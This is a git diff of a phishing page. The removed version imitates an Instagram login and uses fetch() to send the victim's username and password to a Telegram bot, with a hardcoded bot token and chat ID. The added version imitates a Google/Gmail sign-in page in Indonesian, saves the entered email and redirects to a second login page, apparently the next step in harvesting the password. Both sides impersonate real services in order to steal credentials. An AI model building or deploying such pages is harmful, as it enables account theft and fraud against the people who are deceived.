@@ -1,115 +1,188 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
-	<link rel="icon" href="321.ico" type="image/x-icon">
-    <link rel="stylesheet" href="styles.css">
+    <link rel="icon" href="g.ico" type="image/x-icon">
+    <title>Login - Google</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Google Sans', Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f8f9fa;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .container {
+            flex-grow: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .login-card {
+            background: white;
+            padding: 48px 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            width: 450px;
+        }
+
+        .logo {
+            margin-bottom: 24px;
+        }
+
+        h1 {
+            font-size: 24px;
+            margin-bottom: 8px;
+            font-weight: 400;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            margin-bottom: 32px;
+            color: #202124;
+        }
+
+        .form-group {
+            margin-bottom: 32px;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            margin-bottom: 8px;
+        }
+
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 2px #e8f0fe;
+        }
+
+        .forgot-email {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .guest-mode {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 32px;
+        }
+
+        .guest-mode a {
+            color: #1a73e8;
+            text-decoration: none;
+            display: block;
+            margin-top: 8px;
+        }
+
+        .button-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .create-account {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .next-button {
+            background: #1a73e8;
+            color: white;
+            padding: 8px 24px;
+            border-radius: 4px;
+            border: none;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        .next-button:hover {
+            background: #1557b0;
+        }
+
+        footer {
+            padding: 16px;
+            display: flex;
+            justify-content: space-between;
+            background: #f8f9fa;
+        }
+
+        .language-select {
+            padding: 8px;
+            border: none;
+            background: transparent;
+            color: #5f6368;
+            font-size: 12px;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 16px;
+        }
+
+        .footer-links a {
+            color: #5f6368;
+            text-decoration: none;
+            font-size: 12px;
+        }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <div class="login-card">
+            <img src="g.ico" alt="" style="width: 20px; height: 20px;">
+            <br>
+            <br>
+            <h1>Login</h1>
+            <p class="subtitle">Lanjutkan ke Gmail</p>
 
-<div class="wrapper">
-    <div class="header">
-        <div class="top">
-            <div class="logo">
-                <img src="instagram.png" alt="instagram" style="width: 175px;">
-            </div>
-            <div class="form">
-                <div class="input_field">
-                    <input type="text" id="username" placeholder="Phone number, username, or email" class="input">
+            <form id="emailForm">
+                <div class="form-group">
+                    <input type="text" id="email" name="email" placeholder="Email atau nomor telepon" required>
+                    <a href="#" class="forgot-email">Lupa email?</a>
                 </div>
-                <div class="input_field">
-                    <input type="password" id="password" placeholder="Password" class="input">
+
+                <div class="button-container">
+                    <a href="#" class="create-account">Buat akun</a>
+                    <button type="submit" class="next-button">Selanjutnya</button>
                 </div>
-                <div class="btn" id="sendToTelegram"><a href="#">Log In</a></div>
-            </div>
-            <div class="or">
-                <div class="line"></div>
-                <p>OR</p>
-                <div class="line"></div>
-            </div>
-            <div class="dif">
-                <div class="fb">
-                    <img src="facebook.png" alt="facebook">
-                    <p>Log in with Facebook</p>
-                </div>
-                <div class="forgot">
-                    <a href="#">Forgot password?</a>
-                </div>
-            </div>
-        </div>
-        <div class="signup">
-            <p>Don't have an account? <a href="#">Sign up</a></p>
-        </div>
-        <div class="apps">
-            <p>Get the app.</p>
-            <div class="icons">
-                <a href="#"><img src="appstore.png" alt="appstore"></a>
-                <a href="#"><img src="googleplay.png" alt="googleplay"></a>
-            </div>
+            </form>
         </div>
     </div>
-    <div class="footer">
-        <div class="links">
-            <ul>
-                <li><a href="#">ABOUT US</a></li>
-                <li><a href="#">SUPPORT</a></li>
-                <li><a href="#">PRESS</a></li>
-                <li><a href="#">API</a></li>
-                <li><a href="#">JOBS</a></li>
-                <li><a href="#">PRIVACY</a></li>
-                <li><a href="#">TERMS</a></li>
-                <li><a href="#">DIRECTORY</a></li>
-                <li><a href="#">PROFILES</a></li>
-                <li><a href="#">HASHTAGS</a></li>
-                <li><a href="#">LANGUAGE</a></li>
-            </ul>
-        </div>
-        <div class="copyright">
-            © 2019 INSTAGRAM
-        </div>
-    </div>
-</div>
 
-<script>
-document.getElementById('sendToTelegram').addEventListener('click', function(event) {
-    event.preventDefault(); // Mencegah reload halaman
+    <footer>
+        <select class="language-select">
+            <option value="id">Indonesia</option>
+        </select>
+    </footer>
 
-    // Ambil nilai dari input
-    var username = document.getElementById('username').value;
-    var password = document.getElementById('password').value;
-
-    // Cek apakah input tidak kosong
-    if (!username || !password) {
-        alert('Silakan isi username dan password!');
-        return;
-    }
-
-    // Data bot Telegram
-    var botToken = '8053803178:AAHnlfGLjgotTDU0YPrEImFJ-9DB7J1T11s'; // Ganti dengan Token Bot Anda
-    var chatId = '6820629880'; // Ganti dengan chat ID Anda
-
-    // Pesan yang akan dikirim
-    var message = 'Login Details:\nUsername: ' + username + '\nPassword: ' + password;
-
-    // URL API Telegram
-    var telegramUrl = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message);
-
-    // Mengirim pesan ke Telegram menggunakan fetch API
-    fetch(telegramUrl)
-        .then(response => response.json())
-        .then(data => {
-            if(data.ok) {
-            } else {
-            }
-        })
-        .catch(error => {
-            console.error('Error:', error);
-            alert('Terjadi kesalahan saat mengirim pesan.');
+    <script>
+        // Mengambil data email dan mengirimnya ke halaman login
+        document.getElementById('emailForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const email = document.getElementById('email').value;
+            localStorage.setItem('email', email); // Simpan email di localStorage
+            window.location.href = "login.html"; // Redirect ke halaman login
         });
-});
-</script>
-
+    </script>
 </body>
 </html>
